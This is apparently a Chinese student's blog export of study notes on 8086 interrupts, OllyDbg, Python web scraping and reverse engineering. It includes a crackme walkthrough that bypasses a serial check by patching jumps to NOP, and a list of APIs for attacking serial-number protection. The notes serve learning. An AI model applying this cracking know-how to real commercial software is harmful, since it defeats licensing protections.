<h3 id="外中断信息"><a href="#外中断信息" class="headerlink" title="外中断信息"></a>外中断信息</h3><p>当cpu外部有需要处理的事情发生的时候，相关芯片将向cpu发出相应的中断信息。cpu在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的输入  </p>
<h4 id="外中断源："><a href="#外中断源：" class="headerlink" title="外中断源："></a>外中断源：</h4><ul>
<li>可屏蔽中断</li>
</ul>
<p>是cpu可以不响应的外中断。如果IF=1，则cpu在执行完当前指令后响应中断；如果IF=0，则不响应可屏蔽中断<br>中断类型码由数据总线送入cpu，不由cpu产生</p>
<p>8086提供的设置IF指令：<br>1.sti—-设置IF=1<br>2.cli—-设置IF=0  </p>
<ul>
<li>不可屏蔽中断</li>
</ul>
<p>是cou必须响应的外中断。<br>对于8086cpu，不可屏蔽中断的中断类型码固定为2</p>
<p>几乎所有由外设引发的外中断都是可屏蔽中断<br>不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知cpu的中断信息</p>
<h3 id="pc机键盘的处理过程"><a href="#pc机键盘的处理过程" class="headerlink" title="pc机键盘的处理过程"></a>pc机键盘的处理过程</h3><ol>
<li>键盘输入<br>按下一个键时，键盘中的芯片产生一个扫描码（通码），说明了按下的建在键盘上的位置；松开按下的键时，也产生一个扫描码（断码），送入60h端口<br>扫描码的长度为一个字节，通码第七位为0，断码第七位为1：通码+80h=通码</li>
<li>引发9号中断<br>相关芯片向cpu发出中断类型码为9的可屏蔽中断信息</li>
<li>执行int 9 中断例程<br>BIOS提供了int 9中断例程，用来进行基本的键盘输入处理：<br>1.读出扫描码<br>2.如果是字符键的扫描码，将该扫描码和对应的ASCII码送入内存中的BIOS键盘缓冲区；如果是控制键，则将其转变为状态字节（二进制位控制状态的字节）写入内存中储存状态字节的单元<br>3.对键盘系统进行相关控制</li>
</ol>
<p>BIOS键盘缓冲区是系统启动后，BIOS用于存放INT 9中断例程所接收的键盘输入的内存区。可以储存15个键盘输入，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码  </p>
<h2 id="直接定址表"><a href="#直接定址表" class="headerlink" title="直接定址表"></a>直接定址表</h2><h3 id="描述了单元长度的标号"><a href="#描述了单元长度的标号" class="headerlink" title="描述了单元长度的标号"></a>描述了单元长度的标号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br></pre></td></tr></table></figure>
<p>a,b 后面没有’:’ ，这种标号不但表示了内存单元的地址，还表示了内存单元的长度，即字节单元(db)或字单元(dw)或双子单元(dd)</p>
<p>offset操作符：取得标号的段地址（<a href="https://brubbish.github.io/34199.html#offset">https://brubbish.github.io/34199.html#offset</a> ）<br>seg操作符：取得标号的段地址  </p>
<h1 id="OllyDbg-学习"><a href="#OllyDbg-学习" class="headerlink" title="OllyDbg 学习"></a>OllyDbg 学习</h1><h2 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h2><p>有EAX、ECX、EDX、EBX、ESP、EBP、ESI等。<br>调试时可以双击寄存器，修改寄存器的值。对EIP寄存器需要在反汇编窗口选择新的指令起始地址（’New origin here’）<br>标志寄存器：C、P、A、Z、S、T、D、O,双击值可以在0和1值切换  </p>
<h2 id="单步跟踪快捷键"><a href="#单步跟踪快捷键" class="headerlink" title="单步跟踪快捷键"></a>单步跟踪快捷键</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F7    单步步进，遇到call指令跟进</span><br><span class="line">F8    单步步过，遇到call指令不跟进</span><br><span class="line">F9+CTRL   直到出现ret&#x2F;retf&#x2F;iret指令中断</span><br><span class="line">F9+Alt    回到应用程序领空</span><br><span class="line">F9    运行程序</span><br><span class="line">F2    设置断点</span><br><span class="line">F2+CTRL   重新调试</span><br><span class="line">F12   暂停程序</span><br></pre></td></tr></table></figure>
<h2 id="一个TraceMe"><a href="#一个TraceMe" class="headerlink" title="一个TraceMe"></a>一个TraceMe</h2><p>win32位获取文本框中内容的函数：<br>GetDlgItemTextA<br>GetDlgItemTextW<br>GetWindowTextA<br>GetWindowTextW<br>用’CTRL+G’打开跟随表达式窗口进行搜索  </p>
<p>在函数入口处设一个断点，程序执行到此处暂停<br><img src="https://s2.ax1x.com/2020/02/21/3KiIIJ.png" alt=""><br>然后按’F9+Alt’跳到调用函数的位置<br>&emsp;</p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KEqte.png" alt=""><br>004011E5-004011F5是用来判断用户名和序列号的<br>顺便：因为真没见过test指令所以搜了一下：<a href="https://www.jianshu.com/p/d989403729ab" target="_blank" rel="noopener">汇编语言—test和cmp区别</a><br>&emsp;</p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KiTi9.png" alt=""><br>执行到004011F5处，为了不跳转，把ZF寄存器取反或把此处指令改为nop<br>另外，程序限制字符要大于4个，在004011D5的位置。可以把此处跳转的指令（jl）改为nop，或把SF值和OF值改为相同。<br><img src="https://s2.ax1x.com/2020/02/21/3Ki5a4.png" alt="..."></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>python 爬虫学习</title>
    <url>/710f8e5f.html</url>
    <content><![CDATA[<p>就此开一篇单独记录 py 爬虫的学习<u>以及实操中遇到的问题</u>(可能吧)<br>（分割线用（***或—-））</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h1 id="爬虫入门"><a href="#爬虫入门" class="headerlink" title="爬虫入门"></a>爬虫入门</h1><p>以下为 mooc 上 BIT 嵩天老师课程<a href="https://www.icourse163.org/learn/BIT-1001870001?tid=1206951268#/learn/announce" target="_blank" rel="noopener">Python 网络爬虫与信息提取</a>的学习</p>
<h2 id="requests-库"><a href="#requests-库" class="headerlink" title="requests 库"></a>requests 库</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>管理员打开 cmd，安装 requests 库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyB5j.md.png" alt="以此检测安装成功"></p>
<h4 id="tip：-pip-下载超时（timeout）"><a href="#tip：-pip-下载超时（timeout）" class="headerlink" title="tip： pip 下载超时（timeout）"></a>tip： pip 下载超时（timeout）</h4><p>cmd 输入指令：</p>
<ol>
<li>pip —default-timeout=100 install -U pip</li>
</ol>
<p>或</p>
<ol>
<li>pip install pip -U</li>
</ol>
<p>pip config set global.index-url <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a><br> （升级 pip 后更换为的清华镜像）</p>
<h3 id="r-request-get-url"><a href="#r-request-get-url" class="headerlink" title="r=request.get(url)"></a>r=request.get(url)</h3><p>构造一个向服务器请求资源的 request 对象，返回一个包含服务器资源的 response 对象<br>response 对象包含了服务器返回的所有信息</p>
<p><img src="https://s1.ax1x.com/2020/03/17/8tysGn.md.png" alt="8tysGn.md.png"></p>
<p>r.apparent_encoding: 根据网页内容分析出的编码方式<br>r.encoding: 如果 header 中不存在 charset，则默认编码为 ISO-8859-1</p>
<h3 id="爬取网页的通用代码框架"><a href="#爬取网页的通用代码框架" class="headerlink" title="爬取网页的通用代码框架"></a>爬取网页的通用代码框架</h3><p><img src="https://s1.ax1x.com/2020/03/17/8tyy2q.md.png" alt="8tyy2q.md.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requsets</span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 判断状态  如果不是200，则引发HTTPError异常</span></span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    url=<span class="string">"http://www.baidu.com"</span></span><br><span class="line">    print(<span class="string">"getHTMLText(url))</span></span><br></pre></td></tr></table></figure>
<p>try：python 捕捉异常语句，详见：<a href="https://www.runoob.com/python/python-exceptions.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-exceptions.html</a></p>
<h3 id="requests-库主要方法"><a href="#requests-库主要方法" class="headerlink" title="requests 库主要方法"></a>requests 库主要方法</h3><p><img src="https://s1.ax1x.com/2020/03/17/8ty6x0.md.png" alt="8ty6x0.md.png"></p>
<p>requests.request(method, url, <strong>kwargs)<br>requests.get(url, params=None, </strong>kwargs)<br>requests.head(url, <strong>kwargs)<br>requests.post(url, data=None, json=None, </strong>kwargs)<br>requests.put(url, data=None, <strong>kwargs)<br>requests.patch(url, data=None, </strong>kwargs)<br>requests.delete(url, **kwargs)</p>
<h4 id="kwargs"><a href="#kwargs" class="headerlink" title="**kwargs:"></a>**kwargs:</h4><ol>
<li>params：字典或字节序列，作为参数添加到 url 中</li>
<li>data：字典、字节序列或文件对象，作为 request 的内容</li>
<li>json：json 格式的数据，作为 request 的内容</li>
<li>headers：定制 header</li>
<li>cookies</li>
<li>auth</li>
<li>files：传输文件</li>
<li>timeout：设定超时时间，单位为秒</li>
<li>proxies：设置代理服务器</li>
<li>allow_redirects</li>
<li>stream</li>
<li>verify</li>
<li>cert</li>
</ol>
<h3 id="爬虫尺寸"><a href="#爬虫尺寸" class="headerlink" title="爬虫尺寸"></a>爬虫尺寸</h3><p>小规模：爬取网页。数据量小，速度不敏感。使用 requests 库<br>中规模：爬取网站。数据量大，速度敏感。使用 scrapy 库<br>大规模：爬取全网。（搜索引擎）</p>
<h3 id="限制爬虫"><a href="#限制爬虫" class="headerlink" title="限制爬虫"></a>限制爬虫</h3><ol>
<li>来源审查：判断 user-agent</li>
<li>robots 协议</li>
</ol>
<h3 id="robots-协议"><a href="#robots-协议" class="headerlink" title="robots 协议"></a>robots 协议</h3><p>Robots Exclusion Standard<br>网络爬虫先识别 robots.txt 再进行爬取<br>robots 协议时建议而非约束性，不遵守的话存在法律风险（类人行为可不参考 robots 协议）</p>
<h3 id="拒绝被爬：尝试修改-user-agent"><a href="#拒绝被爬：尝试修改-user-agent" class="headerlink" title="拒绝被爬：尝试修改 user-agent"></a>拒绝被爬：尝试修改 user-agent</h3><p><img src="https://s1.ax1x.com/2020/03/19/8y3yQ0.md.png" alt="主要为黄色荧光部分"></p>
<h3 id="搜索引擎关键词提交"><a href="#搜索引擎关键词提交" class="headerlink" title="搜索引擎关键词提交"></a>搜索引擎关键词提交</h3><p>百度：<a href="https://www.baidu.com/s?wd=" target="_blank" rel="noopener">https://www.baidu.com/s?wd=</a><u>关键词</u></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">keyword=<span class="string">"xxxx"</span></span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">'wd'</span>:keyword&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">"https://www.baidu.com/s"</span>,params=kv)</span><br></pre></td></tr></table></figure>
<h3 id="图片的爬取和存储"><a href="#图片的爬取和存储" class="headerlink" title="图片的爬取和存储"></a>图片的爬取和存储</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url=<span class="string">"....../...jpg"</span></span><br><span class="line">root=<span class="string">"D://pics//"</span></span><br><span class="line">path=root+url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]    <span class="comment">#需要import os</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">        os.mkdir(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#保存↓</span></span><br><span class="line">        <span class="keyword">with</span> open(path,<span class="string">'wb'</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            print(<span class="string">"成功“)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print("</span>文件已存在<span class="string">")</span></span><br><span class="line"><span class="string">except:</span></span><br><span class="line"><span class="string">    print("</span>失败<span class="string">")</span></span><br></pre></td></tr></table></figure>
<h2 id="BeautifulSoup-库"><a href="#BeautifulSoup-库" class="headerlink" title="BeautifulSoup 库"></a>BeautifulSoup 库</h2><p>BeautifulSoup 库是一个解析、遍历、维护标签树的功能库</p>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>cmd 下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">或</span><br><span class="line"><span class="keyword">import</span> bs4</span><br></pre></td></tr></table></figure>
<p>作用：html 文档 ↔ 标签树 ↔beautifulsoup 类</p>
<h3 id="BeautifulSoup-基本元素"><a href="#BeautifulSoup-基本元素" class="headerlink" title="BeautifulSoup 基本元素"></a>BeautifulSoup 基本元素</h3><p><img src="https://s1.ax1x.com/2020/03/19/8yjZ5R.md.png" alt="8yjZ5R.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjEVJ.md.png" alt="8yjEVJ.md.png"></p>
<p>例：<br>打印标签</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">r=requests.get(<span class="string">"https://python123.io/ws/demo.html"</span>)</span><br><span class="line">demo=r.text</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">"html.parser"</span>)  <span class="comment">#parser:html解析器</span></span><br><span class="line">soup.title  <span class="comment">#打印title标签</span></span><br><span class="line">soup.a.attrs[<span class="string">"href"</span>]   <span class="comment">#打印标签的链接</span></span><br></pre></td></tr></table></figure>
<h3 id="html-内容遍历"><a href="#html-内容遍历" class="headerlink" title="html 内容遍历"></a>html 内容遍历</h3><p>html—树形结构<br>遍历：下行遍历、上行遍历、平行遍历</p>
<h4 id="下行遍历："><a href="#下行遍历：" class="headerlink" title="下行遍历："></a>下行遍历：</h4><p><img src="https://s1.ax1x.com/2020/03/21/8fFk0H.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(child) <span class="keyword">in</span> soup.body.children:</span><br><span class="line">    print(child)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">获得子节点的数量：</span><br><span class="line">len(soup.body.contents)</span><br><span class="line"></span><br><span class="line">获得其中某个的内容：</span><br><span class="line">soup.body.contents[<span class="number">1</span>]   <span class="comment">#获得第二个</span></span><br></pre></td></tr></table></figure>
<p>ps:’儿子节点’这种叫法听起来真是贼奇怪</p>
<h4 id="上行遍历："><a href="#上行遍历：" class="headerlink" title="上行遍历："></a>上行遍历：</h4><p><img src="https://s1.ax1x.com/2020/03/21/8fFPXD.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看父标签:</span><br><span class="line">soup.title.parent</span><br><span class="line">最高级标签（&lt;html&gt;他爸是他自己（.....)</span><br><span class="line"></span><br><span class="line">完整遍历：</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">"html.parser"</span>)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">    <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(parent)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(parent)</span><br></pre></td></tr></table></figure>
<h4 id="平行遍历："><a href="#平行遍历：" class="headerlink" title="平行遍历："></a>平行遍历：</h4><p>发生在同一个父节点下的各个节点间<br>平行遍历获得的下一个结点不一定是标签类型</p>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFFne.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看下一个平行标签:</span><br><span class="line">soup.a.next_sibling</span><br><span class="line">查看前一个平行标签:</span><br><span class="line">soup.a.previous_sibling</span><br><span class="line"></span><br><span class="line">完整：</span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next（或前序结点previous）_siblings:</span><br><span class="line">    print(sibling)</span><br></pre></td></tr></table></figure>
<h3 id="Prettify"><a href="#Prettify" class="headerlink" title="Prettify"></a>Prettify</h3><p>作用：在每个标签后添加换行符，print 的时候易于阅读<br>使用方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">print(soup.prettify())</span><br><span class="line"></span><br><span class="line">print(soup.a.prettify())    <span class="comment">#单独对某个标签进行处理</span></span><br></pre></td></tr></table></figure>
<p>&emsp;</p>
<p>以上为 2020.3.16-2020.3.21</p>
<hr>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>regular expression (RE)</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>实例                              </th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>任何单个字符</td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集</td>
<td>[abc]:a、b、c; [a-z]:a~z 单个字符 </td>
</tr>
<tr>
<td><sup><a href="#fn_ " id="reffn_ "> </a></sup></td>
<td>非字符集</td>
<td><sup><a href="#fn_abc" id="reffn_abc">abc</a></sup>: 非 a、b、c 的单个字符     </td>
</tr>
<tr>
<td>*</td>
<td>前一个字符 0 次或无限次扩展</td>
<td>abc *：ab、abc、abcc… ..       </td>
</tr>
<tr>
<td>+</td>
<td>前一个字符 1 次或无限次扩展</td>
<td>abc *：abc、abcc… ..          </td>
</tr>
<tr>
<td>?</td>
<td>前一个字符 0 次或 1 次扩展</td>
<td>abc *：abc、abcc… ..           </td>
</tr>
<tr>
<td>\</td>
<td></td>
<td>左右表达式任意一个： abc\ def :abc 或 def </td>
</tr>
<tr>
<td>{num}</td>
<td>扩展前一个字符 m 次</td>
<td>ab{2}c：abbc                     </td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td>^abc:abc 在字符串的开头         </td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td>$abc:abc 在字符串的结尾     </td>
</tr>
<tr>
<td>( )</td>
<td>分组标记，内部使用\</td>
<td>操作符 (abc):abc; (abc</td>
<td>def):abc 或 def </td>
</tr>
<tr>
<td>\d</td>
<td>等价于 0~9</td>
</tr>
<tr>
<td>\w</td>
<td>等价于 A ~ Z, a ~ z, 0 ~ 9, _</td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://www.runoob.com/regexp/regexp-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
<h2 id="Re-库"><a href="#Re-库" class="headerlink" title="Re 库"></a>Re 库</h2><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure>
<h3 id="表达式的表达类型"><a href="#表达式的表达类型" class="headerlink" title="表达式的表达类型"></a>表达式的表达类型</h3><p>raw string：不包含转义符(\)的字符串<br>string 类型(将’\’理解为转义符)<br>raw string 如：r’[1-9]\d{5}’、r’\d{3}-\d{8}\d{4}-\d{7}’<br>string 如：[1-9]\\\d{5}’\\\d{3}-\\\d{8}\\\d{4}-\\\d{7}’</p>
<h3 id="主要功能函数"><a href="#主要功能函数" class="headerlink" title="主要功能函数"></a>主要功能函数</h3><p><img src="https://s1.ax1x.com/2020/03/26/GSHMGD.png" alt=" "></p>
<ol>
<li>re.search(pattern,string,flags=0)</li>
<li>re.match(pattern,string,flags=0)</li>
<li>re.findall(pattern,string,flags=0)</li>
<li>re.finditer(pattern,stirng,flags=0)</li>
</ol>
<p>pattern: 正则表达式的字符串或原生字符串表示<br>string：待匹配字符串</p>
<p>flags：正则表达式使用时的一些控制标记，包括：<br>re. I:ignorecase, 忽略大小写<br>re. M:multiline, 使用’^’时将每行都当作匹配开始<br>re. S:dotall, 让’.’匹配所有字符，包括换行符</p>
<ol>
<li>re.search(pattern,string,maxsplit=0,flags=0)</li>
</ol>
<p>maxsplit: 最大分割数，限制分割的数量为 n，将剩下的所有部分输出为第 n+1 个</p>
<ol>
<li>re.sub(pattern,repl,string,count=0,flags=0)</li>
</ol>
<p>repl: 替换的字符串<br>count：替换的最大次数<br>&emsp;</p>
<p>以上为2020.03.22-2020.03.28</p>
<hr>
<h3 id="RE库的match对象"><a href="#RE库的match对象" class="headerlink" title="RE库的match对象"></a>RE库的match对象</h3><p>用 type(match)检查 match 的类型</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GGx6qs.png" alt=" "><br><img src="https://s1.ax1x.com/2020/04/02/GGxyrj.png" alt=" "></p>
<h3 id="贪婪匹配和最小匹配"><a href="#贪婪匹配和最小匹配" class="headerlink" title="贪婪匹配和最小匹配"></a>贪婪匹配和最小匹配</h3><p>re库默认采用贪婪匹配，即输出匹配最长的子串</p>
<h2 id="Scrapy库"><a href="#Scrapy库" class="headerlink" title="Scrapy库"></a>Scrapy库</h2><h3 id="scrapy爬虫框架安装"><a href="#scrapy爬虫框架安装" class="headerlink" title="scrapy爬虫框架安装"></a>scrapy爬虫框架安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">scrapy -h    # 测试安装成功</span><br></pre></td></tr></table></figure>
<h3 id="scrapy-爬虫框架结构"><a href="#scrapy-爬虫框架结构" class="headerlink" title="scrapy 爬虫框架结构"></a>scrapy 爬虫框架结构</h3><p>5个主体+2个中间件<br>3个主体（engine+downloader+scheduler）为已有实现<br>2个主体（item pipelines+spiders）为用户配置：<br>item pipelines对获得信息进行处理<br>spiders提供url和解析网页的内容  </p>
<p>**以下3个不需要用户配置<br>engine控制所有模块之间的数据流，根据条件触发事件<br>downloader根据请求下载<br>scheduler对所有爬取进行调度<br>在以上三个中有一个中间件：downloader middleware   </p>
<h3 id="scrapy库爬虫常用命令"><a href="#scrapy库爬虫常用命令" class="headerlink" title="scrapy库爬虫常用命令"></a>scrapy库爬虫常用命令</h3><p>格式：scrapy<command>[options][args]<br>一个工程是最大的单元（大的scrapy框架），其中有多个spider<br><img src="https://s1.ax1x.com/2020/04/05/GBh3Pf.png" alt=" "></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>….</p>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><h3 id="中国大学排名爬取"><a href="#中国大学排名爬取" class="headerlink" title="中国大学排名爬取"></a>中国大学排名爬取</h3><p>数据来源：<a href="http://www.zuihaodaxue.com/zuihaodaxuepaiming2019.html" target="_blank" rel="noopener">软科中国最好大学排名2019</a>   </p>
<ol>
<li>获取网页内容：gethtmltext()  </li>
<li>提取信息到合适的数据结构：fillunivlist()  </li>
<li>输出结果：printunivlist()</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethtmltext</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">" "</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillunivlist</span><span class="params">(ulist,html)</span>:</span></span><br><span class="line">    soup=BeautifulSoup(html,<span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr,bs4.element.Tag):</span><br><span class="line">            tds=tr(<span class="string">'td'</span>)</span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printunivlist</span><span class="params">(ulist,num)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;"</span>.format(<span class="string">"排名"</span>,<span class="string">"学校名称"</span>,<span class="string">"总分"</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        print(<span class="string">"&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;"</span>.format(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>]))</span><br><span class="line">        </span><br><span class="line">    print(<span class="string">"suc"</span>+str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo=[]<span class="comment"># 存放大学信息</span></span><br><span class="line">    url=<span class="string">"http://www.zuihaodaxue.com/zuihaodaxuepaiming2019.html"</span></span><br><span class="line">    html=gethtmltext(url)</span><br><span class="line">    fillunivlist(uinfo,html)</span><br><span class="line">    printunivlist(uinfo,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.30-2020.04.05</title>
    <url>/20849.html</url>
    <content><![CDATA[<h1 id="关于上周博客炸了的问题"><a href="#关于上周博客炸了的问题" class="headerlink" title="关于上周博客炸了的问题"></a>关于上周博客炸了的问题</h1><p>原因是两个_config.yml（可能还有其他文件吧）里所有缩进都不见了….不知道是为啥，就甩给 vscode 和格式化代码插件吧（….)<br>然后，原来 .yml 要用缩进表示层级啊….<br>嗯顺便换了个主题</p>
<h1 id="64-位软件逆向技术"><a href="#64-位软件逆向技术" class="headerlink" title="64 位软件逆向技术"></a>64 位软件逆向技术</h1><h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>c++的三大核心机制是封装、继承、多态，虚函数是多态的一种体现。在逆向过程中，虚函数是一种还原面向对象代码的重要手段</p>
<h3 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h3><p>不同的类虚表不同，相同的类对象共享一个虚表<br>（以下讲的是用 c++写的程序）<br>在构造函数中，首先初始化虚表指针，然后初始化数据成员，最后返回 this 指针<br><a id="more"></a><br>c++语法规定，析构函数需要调用虚函数的无多态性，因此析构函数首先需要赋值虚表<br>构造函数和析构函数特征一致，可根据调用的先后顺序确定<br>虚表地址在全局数据区中</p>
<h1 id="序列号（注册码）保护方式"><a href="#序列号（注册码）保护方式" class="headerlink" title="序列号（注册码）保护方式"></a>序列号（注册码）保护方式</h1><h2 id="序列号保护机制"><a href="#序列号保护机制" class="headerlink" title="序列号保护机制"></a>序列号保护机制</h2><p>验证用户名和序列号之间的映射关系（….也有可能没有关系）<br>检查方法：</p>
<ol>
<li>将用户名等信息通过变换后得到注册码<br>序列号=F（用户名）<br>这个方法计算出的序列号以明文形式在内存中出现<br>也可通过修改比较指令的方法通过检查<br>再现了生成注册码的过程，不安全</li>
<li>通过注册码验证用户名<br>生成注册码时：序列号=F（用户名），检查注册码时：用户名=F^（-1）（序列号）<br>生成注册码的函数和注册码明文未出现在软件代码中<br>破解可考虑：1.修改比较指令，2.通过 F^(-1)找出 F</li>
<li>通过对等函数检查<br>F1（用户名）=F2（序列号）<br>与 2 类似</li>
<li>同时将用户名和序列号作为自变量<br>特定值=F（用户名，序列号）<br>可能失去了用户名和序列号的一一对应关系</li>
</ol>
<h2 id="攻击序列号保护机制"><a href="#攻击序列号保护机制" class="headerlink" title="攻击序列号保护机制"></a>攻击序列号保护机制</h2><p>找到序列号或修改判断序列号后的跳转指令<br>跟踪程序启动时（需要将注册码读出并判断）或输入注册码，对 api 设置断点<br>常用：  </p>
<ol>
<li><p>将输入的内容复制到缓冲区： GetWindowTextA(W)、GetDlgItemTextA(W)、GetDlgItemInt   </p>
</li>
<li><p>判断后显示的对话框：MessageBoxA(W)、MessageBoxExA(W)、ShowWindow、MessageBoxIndirectA(W)、CreateDialogParamA(W)、CreateDialogIndirectParamA(w)、DialogBoxParamA(W)、DialogBoxIndirectParamA(W)    </p>
</li>
<li><p>启动时读取注册码：<br>RegQueryValueExA(W)(序列号放在注册表);<br>GetPrivateProfileStringA(W)、GetPrivateProfileIntA(W)、GetProfileIntA(W)、GetProfileStringA(W)(序列号放在 INI 文件中);<br>CreateFileA(W)、_lopen()(放在一般文件)   </p>
</li>
</ol>
